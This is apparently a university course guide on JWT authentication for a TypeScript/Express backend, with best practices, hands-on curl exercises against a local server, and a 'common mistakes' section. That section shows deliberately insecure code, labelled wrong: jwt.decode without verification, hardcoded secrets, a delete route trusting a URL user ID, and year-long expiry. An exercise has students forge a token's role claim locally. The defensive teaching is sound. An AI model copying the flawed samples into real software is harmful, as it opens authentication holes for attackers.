2. **Output Encoding** - Escape HTML when displaying user content (e.g., user names, messages)
3. **Content Security Policy (CSP)** - HTTP header that restricts script sources
4. **httpOnly Cookies** - Store JWT in cookies inaccessible to JavaScript (alternative to localStorage)

**TCSS-460-auth-squared backend protections** (prevents storing XSS payloads):
```typescript
body('username')
    .trim()
    .isLength({ min: 3, max: 50 })
    .matches(/^[a-zA-Z0-9_-]+$/)  // Only allow safe characters
    .withMessage('Username can only contain letters, numbers, underscores, and hyphens'),
```

---

## Best Practices

Based on TCSS-460-auth-squared implementation and industry standards.

### 1. Use Standard Authorization Header

✅ **Preferred**:
```typescript
Authorization: Bearer <token>
```

❌ **Avoid**:
```typescript
X-Custom-Token: <token>
```

**Why?** `Authorization: Bearer` is the industry standard (RFC 6750). Most tools, libraries, and documentation expect this format.

### 2. Validate Token on Every Request

**TCSS-460-auth-squared approach**:
```typescript
// Apply to all protected routes
closedRoutes.use(checkToken);
```

**Don't trust the client** - always verify the token signature on the server.

### 3. Include Minimal Claims

Only include what you need in the token payload:

✅ **Good** (TCSS-460-auth-squared):
```typescript
{
    id: 123,
    email: "user@example.com",
    role: 1
}
```

❌ **Bad** (too much data):
```typescript
{
    id: 123,
    email: "user@example.com",
    firstname: "John",
    lastname: "Doe",
    address: "123 Main St",
    phone: "555-1234",
    birthdate: "1990-01-01",
    // ... everything from database
}
```

**Why?**
- Larger tokens = more bandwidth per request
- More data exposure if token is intercepted
- Changed data requires new token

### 4. Use Different Tokens for Different Purposes

**TCSS-460-auth-squared uses 3 token types**:

```typescript
// Access token - 14 days
generateAccessToken({ id, email, role });

// Password reset - 15 minutes
generatePasswordResetToken(userId, email);

// Email verification - 24 hours
generateVerificationToken(userId, 'email');
```

**Benefits**:
- Different expiration based on sensitivity
- Type-specific validation
- Better security boundaries

### 5. Validate Token Type in Critical Operations

**Password reset validation** (from authController.ts, lines 283-300):
```typescript
static async resetPassword(request: IJwtRequest, response: Response) {
    const { token, password } = request.body;

    try {
        // Verify token
        let decoded: any;
        try {
            decoded = jwt.verify(token, getEnvVar('JWT_SECRET'));
        } catch (error) {
            sendError(response, 400, 'Invalid or expired reset token',
                     ErrorCodes.AUTH_INVALID_TOKEN);
            return;
        }

        // CRITICAL: Validate token type
        if (decoded.type !== 'password_reset') {
            sendError(response, 400, 'Invalid reset token',
                     ErrorCodes.AUTH_INVALID_TOKEN);
            return;
        }

        // Proceed with password reset
        // ...
    }
}
```

**Why?** Prevents using an access token to reset passwords.

### 6. Log Authentication Events

**TCSS-460-auth-squared logging**:
```typescript
try {
    // ... authentication logic
} catch (error) {
    console.error('Login error:', error);
    sendError(response, 500, 'Server error - contact support',
             ErrorCodes.SRVR_DATABASE_ERROR);
}
```

**Enhanced logging for production**:
```typescript
console.log({
    event: 'login_success',
    userId: account.account_id,
    email: account.email,
    timestamp: new Date().toISOString(),
    ip: request.ip
});
```

### 7. Handle Token Errors Gracefully

**Different error scenarios**:

```typescript
jwt.verify(token, secret, (error, decoded) => {
    if (error) {
        if (error.name === 'TokenExpiredError') {
            // Token expired - user needs to log in again
            return res.status(401).json({
                success: false,
                message: 'Token expired, please log in again'
            });
        }

        if (error.name === 'JsonWebTokenError') {
            // Invalid token - malformed or wrong signature
            return res.status(403).json({
                success: false,
                message: 'Invalid token'
            });
        }

        // Other errors
        return res.status(500).json({
            success: false,
            message: 'Token verification failed'
        });
    }

    // Token valid
    next();
});
```

### 8. Use TypeScript for Type Safety

**TCSS-460-auth-squared approach**:

```typescript
// Define clear interfaces
export interface IJwtClaims {
    id: number;
    name: string;
    role: UserRole;
    iat?: number;
    exp?: number;
}

export interface IJwtRequest extends Request {
    claims?: IJwtClaims;
}

// Use in route handlers with type safety
static async changePassword(request: IJwtRequest, response: Response) {
    const userId = request.claims.id;  // TypeScript knows this exists!
}
```

---

## Common Mistakes and How to Avoid Them

Learn from common JWT pitfalls to build more secure applications.

### Mistake 1: Storing Sensitive Data in Payload

❌ **Wrong**:
```typescript
const token = jwt.sign({
    id: user.id,
    email: user.email,
    password: user.password,  // NEVER!
    ssn: user.ssn,            // NEVER!
    creditCard: user.card     // NEVER!
}, secret);
```

**Why it's wrong**: JWT payloads are base64-encoded, not encrypted. Anyone can decode them:
```bash
echo "eyJwYXNzd29yZCI6InNlY3JldDEyMyJ9" | base64 -d
# Output: {"password":"secret123"}
```

✅ **Correct**:
```typescript
const token = jwt.sign({
    id: user.id,
    email: user.email,
    role: user.role
}, secret);
```

🎯 **Fix**: Only include non-sensitive identifiers and claims.

### Mistake 2: Not Checking Token Expiration

❌ **Wrong**:
```typescript
const decoded = jwt.decode(token);  // Just decodes, doesn't verify!
const userId = decoded.id;
// Use userId without checking if token is expired or valid
```

**Why it's wrong**: `jwt.decode()` doesn't verify the signature or check expiration.

✅ **Correct** (TCSS-460-auth-squared approach):
```typescript
jwt.verify(token, process.env.JWT_SECRET, (error, decoded) => {
    if (error) {
        return res.status(403).json({ message: 'Token is not valid' });
    }
    // Token is verified and not expired
    request.claims = decoded;
    next();
});
```

🎯 **Fix**: Always use `jwt.verify()`, never `jwt.decode()` for authentication.

### Mistake 3: Using Weak or Exposed Secrets

❌ **Wrong**:
```typescript
// Hardcoded in source code
const token = jwt.sign(payload, 'mysecret');

// Committed to Git
JWT_SECRET=secret123

// Shared in documentation
// To run this project, use JWT_SECRET=abc123
```

**Why it's wrong**: If the secret is exposed, anyone can create valid tokens.

✅ **Correct**:
```typescript
// Use environment variable
const token = jwt.sign(payload, process.env.JWT_SECRET);

// .env file (not committed to Git)
JWT_SECRET=8f7a9b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8

// .gitignore
.env
```

🎯 **Fix**: Generate cryptographically secure secrets and store in environment variables.

### Mistake 4: Not Using HTTPS in Production

❌ **Wrong**:
```bash
# Production server running on HTTP
http://api.example.com/auth/login
```

**Why it's wrong**: JWTs sent over HTTP can be intercepted by anyone on the network.

✅ **Correct**:
```bash
# Production server with HTTPS
https://api.example.com/auth/login
```

🎯 **Fix**: Always use HTTPS in production. Use Let's Encrypt for free SSL certificates.

### Mistake 5: Trusting Client-Provided User IDs

❌ **Wrong**:
```typescript
// Route: DELETE /users/:userId
static async deleteUser(request: IJwtRequest, response: Response) {
    const userId = request.params.userId;  // From URL - can be manipulated!

    // Dangerous: Any authenticated user can delete any user
    await pool.query('DELETE FROM Account WHERE Account_ID = $1', [userId]);
}
```

**Why it's wrong**: User can manipulate the URL to delete other users.

✅ **Correct**:
```typescript
// Use ID from verified JWT
static async deleteOwnAccount(request: IJwtRequest, response: Response) {
    const userId = request.claims.id;  // From verified JWT - secure!

    // User can only delete their own account
    await pool.query('DELETE FROM Account WHERE Account_ID = $1', [userId]);
}
```

🎯 **Fix**: Get user identity from verified JWT claims, not from request parameters.

### Mistake 6: Not Handling All Token Error Cases

❌ **Wrong**:
```typescript
jwt.verify(token, secret, (error, decoded) => {
    if (error) {
        return res.status(401).json({ message: 'Error' });
    }
    next();
});
```

**Why it's wrong**: Different errors need different handling for better UX.

✅ **Correct**:
```typescript
jwt.verify(token, secret, (error, decoded) => {
    if (error) {
        if (error.name === 'TokenExpiredError') {
            return res.status(401).json({
                success: false,
                message: 'Your session has expired. Please log in again.',
                errorCode: 'TOKEN_EXPIRED'
            });
        }

        if (error.name === 'JsonWebTokenError') {
            return res.status(403).json({
                success: false,
                message: 'Invalid authentication token.',
                errorCode: 'TOKEN_INVALID'
            });
        }

        return res.status(500).json({
            success: false,
            message: 'Authentication failed.',
            errorCode: 'AUTH_ERROR'
        });
    }
    next();
});
```

🎯 **Fix**: Provide specific error messages for better debugging and user experience.

### Mistake 7: Extremely Long Expiration Times

❌ **Wrong**:
```typescript
jwt.sign(payload, secret, { expiresIn: '365d' })  // 1 year!
```

**Why it's wrong**: If token is stolen, attacker has access for a full year.

✅ **Correct**:
```typescript
// Access token - reasonable expiration
jwt.sign(payload, secret, { expiresIn: '14d' })  // TCSS-460-auth-squared

// Or with refresh tokens
const accessToken = jwt.sign(payload, secret, { expiresIn: '15m' });
const refreshToken = generateRefreshToken(userId);  // Stored in DB
```

🎯 **Fix**: Balance security and UX. Use refresh tokens for long sessions.

### Mistake 8: Not Validating Claims

❌ **Wrong**:
```typescript
// Accept any valid JWT for password reset
const decoded = jwt.verify(token, secret);
// Reset password without checking token type
```

**Why it's wrong**: User could use an access token to reset passwords.

✅ **Correct** (TCSS-460-auth-squared approach):
```typescript
const decoded = jwt.verify(token, secret);

// Validate token type
if (decoded.type !== 'password_reset') {
    return sendError(response, 400, 'Invalid reset token',
                     ErrorCodes.AUTH_INVALID_TOKEN);
}

// Proceed with password reset
```

🎯 **Fix**: Always validate that the token type matches the operation.

### Mistake 9: Exposing JWT in URLs

❌ **Wrong**:
```bash
# JWT in URL parameter
https://api.example.com/users?token=eyJhbGci...

# JWT in URL path
https://api.example.com/auth/eyJhbGci.../profile
```

**Why it's wrong**: URLs are logged in browser history, server logs, and referrer headers.

✅ **Correct**:
```bash
# JWT in Authorization header
curl -H "Authorization: Bearer eyJhbGci..." https://api.example.com/users
```

🎯 **Fix**: Always use Authorization header for JWTs.

### Mistake 10: Not Using TypeScript Types

❌ **Wrong** (JavaScript):
```javascript
// No type safety
const userId = request.claims.userId;  // Typo! Should be 'id'
const userRole = request.claims.permission;  // Wrong property!
```

**Why it's wrong**: Typos and property mismatches cause runtime errors.

✅ **Correct** (TCSS-460-auth-squared TypeScript):
```typescript
export interface IJwtClaims {
    id: number;
    email: string;
    role: UserRole;
}

export interface IJwtRequest extends Request {
    claims?: IJwtClaims;
}

// TypeScript catches errors at compile time
static async handler(request: IJwtRequest, response: Response) {
    const userId = request.claims.id;  // Type-safe!
    const userRole = request.claims.role;  // Type-safe!
}
```

🎯 **Fix**: Use TypeScript with well-defined interfaces for type safety.

---

## Hands-On Exercises

Practice implementing and testing JWT authentication with these exercises.

### Exercise 1: Generate and Decode a JWT

**Objective**: Understand JWT structure by creating and decoding tokens.

**Step 1: Register a new user**
```bash
curl -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "firstname": "Jane",
    "lastname": "Student",
    "email": "jane.student@uw.edu",
    "password": "SecurePass123!",
    "username": "janestudent",
    "phone": "2065551234"
  }'
```

**Step 2: Save the JWT from response**
```json
{
  "success": true,
  "message": "User registration successful",
  "data": {
    "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "user": { ... }
  }
}
```

**Step 3: Decode the JWT at https://jwt.io**
- Paste your token into the "Encoded" section
- Observe the header, payload, and signature
- Note the `id`, `email`, `role`, `iat`, and `exp` claims

**Questions**:
1. What is the algorithm (`alg`) in the header?
2. What is your user ID (`id`) in the payload?
3. When does the token expire? (Use https://www.epochconverter.com to convert `exp` timestamp)

### Exercise 2: Test Protected vs Public Routes

**Objective**: Understand the difference between authenticated and unauthenticated endpoints.

**Step 1: Test public endpoint (should succeed)**
```bash
curl http://localhost:8000/jwt_test
```

**Expected Response**:
```json
{
  "message": "Hello World! API is working correctly.",
  "timestamp": "2024-03-04T10:30:00.000Z",
  "service": "TCSS-460-auth-squared"
}
```

**Step 2: Test protected endpoint without JWT (should fail)**
```bash
curl -X POST http://localhost:8000/auth/user/password/change \
  -H "Content-Type: application/json" \
  -d '{
    "oldPassword": "SecurePass123!",
    "newPassword": "NewSecurePass456!"
  }'
```

**Expected Response**:
```json
{
  "success": false,
  "message": "Auth token is not supplied"
}
```

**Step 3: Test protected endpoint with JWT (should succeed)**
```bash
# Replace YOUR_JWT_HERE with your actual token
curl -X POST http://localhost:8000/auth/user/password/change \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_HERE" \
  -d '{
    "oldPassword": "SecurePass123!",
    "newPassword": "NewSecurePass456!"
  }'
```

**Questions**:
1. What status code do you get without JWT?
2. What status code do you get with valid JWT?
3. Why does the public endpoint not require authentication?

### Exercise 3: Test Token Expiration

**Objective**: Understand how token expiration works.

**Step 1: Generate a short-lived token (modify code)**

Create a test endpoint in `src/controllers/authController.ts`:
```typescript
static async generateShortToken(request: IJwtRequest, response: Response) {
    const token = jwt.sign(
        { id: 999, email: "test@example.com", role: 1 },
        getEnvVar('JWT_SECRET'),
        { expiresIn: '30s' }  // Expires in 30 seconds
    );

    sendSuccess(response, { token, expiresIn: 30 });
}
```

**Step 2: Use the token immediately (should succeed)**
```bash
curl -H "Authorization: Bearer YOUR_SHORT_TOKEN" \
     http://localhost:8000/auth/user/password/change
```

**Step 3: Wait 31 seconds and try again (should fail)**
```bash
# Wait 31 seconds...
curl -H "Authorization: Bearer YOUR_SHORT_TOKEN" \
     http://localhost:8000/auth/user/password/change
```

**Expected Response**:
```json
{
  "success": false,
  "message": "Token is not valid"
}
```

**Questions**:
1. What happens when you use an expired token?
2. How does the server know the token is expired?
3. Why does TCSS-460-auth-squared use 14-day expiration instead of 30 seconds?

### Exercise 4: Tamper with a Token

**Objective**: Understand why signature verification is critical.

**Step 1: Get a valid token from login**
```bash
curl -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email": "jane.student@uw.edu", "password": "SecurePass123!"}'
```

**Step 2: Decode the token at jwt.io and modify the payload**
- Change `"id": 123` to `"id": 999`
- Change `"role": 1` to `"role": 5` (try to become Owner)
- Copy the resulting "tampered" token

**Step 3: Try to use the tampered token**
```bash
curl -H "Authorization: Bearer TAMPERED_TOKEN_HERE" \
     http://localhost:8000/auth/user/password/change
```

**Expected Response**:
```json
{
  "success": false,
  "message": "Token is not valid"
}
```

**Questions**:
1. Why does the tampered token fail?
2. What would happen if the server didn't verify the signature?
3. How does the signature prevent tampering?

### Exercise 5: Compare Token Sizes

**Objective**: Understand the overhead of JWT compared to session IDs.

**Step 1: Measure JWT size**
```bash
# Get your JWT from login response
JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Count bytes
echo -n "$JWT" | wc -c
# Result: ~200-300 bytes
```

**Step 2: Compare to a session ID**
```bash
# Typical session ID (UUID)
SESSION_ID="550e8400-e29b-41d4-a716-446655440000"

# Count bytes
echo -n "$SESSION_ID" | wc -c
# Result: 36 bytes
```

**Step 3: Calculate overhead per 1000 requests**
```
JWT: 250 bytes × 1000 requests = 250 KB
Session ID: 36 bytes × 1000 requests = 36 KB
Difference: 214 KB per 1000 requests
```

**Questions**:
1. Why is JWT larger than a session ID?
2. What's the trade-off for the extra size?
3. At what scale does JWT size become a concern?

### Exercise 6: Implement Token Refresh (Advanced)

**Objective**: Build a refresh token system for better security.

**Step 1: Create a refresh token table**
```sql
CREATE TABLE refresh_tokens (
    id SERIAL PRIMARY KEY,
    account_id INTEGER REFERENCES Account(Account_ID),
    token VARCHAR(255) UNIQUE NOT NULL,
    expires_at TIMESTAMP NOT NULL,
    created_at TIMESTAMP DEFAULT NOW()
);
```

**Step 2: Implement refresh token generation**
```typescript
export const generateRefreshToken = async (userId: number): Promise<string> => {
    const token = randomUUID();
    const expiresAt = new Date(Date.now() + 14 * 24 * 60 * 60 * 1000);  // 14 days

    await pool.query(
        'INSERT INTO refresh_tokens (account_id, token, expires_at) VALUES ($1, $2, $3)',
        [userId, token, expiresAt]
    );

    return token;
};
```

**Step 3: Implement token refresh endpoint**
```typescript
static async refreshToken(request: IJwtRequest, response: Response) {
    const { refreshToken } = request.body;

    // Verify refresh token in database
    const result = await pool.query(
        'SELECT account_id FROM refresh_tokens WHERE token = $1 AND expires_at > NOW()',
        [refreshToken]
    );

    if (result.rowCount === 0) {
        return sendError(response, 401, 'Invalid refresh token');
    }

    // Generate new short-lived access token
    const userId = result.rows[0].account_id;
    const accessToken = jwt.sign(
        { id: userId },
        getEnvVar('JWT_SECRET'),
        { expiresIn: '15m' }  // Short-lived
    );

    sendSuccess(response, { accessToken });
}
```

**Questions**:
1. Why use both access tokens and refresh tokens?
2. How does this improve security compared to long-lived access tokens?
3. What happens when a refresh token is compromised?

### Exercise 7: Test Security Headers

**Objective**: Understand how to send JWT tokens correctly.

**Test different header formats**:

```bash
# Standard format (should work)
curl -H "Authorization: Bearer YOUR_TOKEN" http://localhost:8000/auth/user/password/change

# Without "Bearer" prefix (should fail)
curl -H "Authorization: YOUR_TOKEN" http://localhost:8000/auth/user/password/change

# Legacy format (should work - TCSS-460-auth-squared supports this)
curl -H "x-access-token: YOUR_TOKEN" http://localhost:8000/auth/user/password/change

# In URL (bad practice - but test it)
curl "http://localhost:8000/auth/user/password/change?token=YOUR_TOKEN"
```

**Questions**:
1. Which formats does TCSS-460-auth-squared accept?
2. Why is "Authorization: Bearer" the preferred format?
3. Why should JWTs never be in URLs?

---

## Summary and Next Steps

### Key Takeaways

🎯 **JWT Structure**: Header.Payload.Signature
- Header defines algorithm
- Payload contains claims (user data)
- Signature prevents tampering

🎯 **TCSS-460-auth-squared Implementation**:
- 14-day expiration for access tokens
- Claims: `id`, `email`, `role`
- Middleware: `checkToken()` validates all protected routes
- Generation: `jwt.sign()` in login/register
- Validation: `jwt.verify()` in middleware

🎯 **Security Best Practices**:
- Use HTTPS in production
- Store JWT_SECRET in environment variables
- Never put sensitive data in payload
- Validate token type for critical operations
- Use different expiration times for different token types

🎯 **Common Mistakes to Avoid**:
- Using `jwt.decode()` instead of `jwt.verify()`
- Storing passwords in token payload
- Exposing JWT_SECRET in code
- Trusting client-provided user IDs
- Not handling token expiration gracefully

### Related Documentation

- **[API Documentation](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/docs-2.0/API_DOCUMENTATION.md)** - Complete API reference
- **[Authentication Guide](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/docs-2.0/authentication-guide.md)** - JWT vs API keys comparison
- **[Web Security Guide](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/docs-2.0/web-security-guide.md)** - XSS, SQL injection, and more
- **[Environment Configuration](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/docs-2.0/environment-configuration.md)** - Managing secrets
- **[Validation Strategies](https://github.com/cfb3/TCSS-460-auth-squared/blob/main/docs-2.0/validation-strategies.md)** - Input validation

### Further Learning

**Explore the TCSS-460-auth-squared Codebase**:
- **JWT Middleware**: `/src/core/middleware/jwt.ts` - Token validation
- **Auth Controller**: `/src/controllers/authController.ts` - Login/register
- **Token Utils**: `/src/core/utilities/tokenUtils.ts` - Token generation
- **Protected Routes**: `/src/routes/closed/index.ts` - Applying middleware
- **Models**: `/src/core/models/index.ts` - Type definitions

**Deep Dive Resources**:
- **RFC 7519**: Official JWT specification - https://tools.ietf.org/html/rfc7519
- **JWT.io**: Interactive JWT debugger - https://jwt.io
- **Auth0 JWT Guide**: Comprehensive JWT documentation - https://auth0.com/docs/tokens/json-web-tokens
- **OWASP JWT Cheat Sheet**: Security best practices - https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html

**Advanced Topics**:
- Refresh tokens and token rotation
- JWT with RSA/ECDSA signatures (asymmetric cryptography)
- OAuth 2.0 and OpenID Connect (built on JWT)
- Token blacklisting and revocation strategies
- JWT with role-based access control (RBAC)

---

## Related Guides

- **[Password Security Guide](./password-security-guide.md)** - Secure password hashing and verification
- **[RBAC Guide](./rbac-guide.md)** - Role-based authorization after authentication
- **[Account Lifecycle Guide](./account-lifecycle-guide.md)** - Complete user account management
- **[Web Security Guide](./web-security-guide.md)** - Comprehensive security best practices

---

**Questions or feedback?** Reach out to cfb3@uw.edu or visit office hours!

**Happy learning! 🚀**
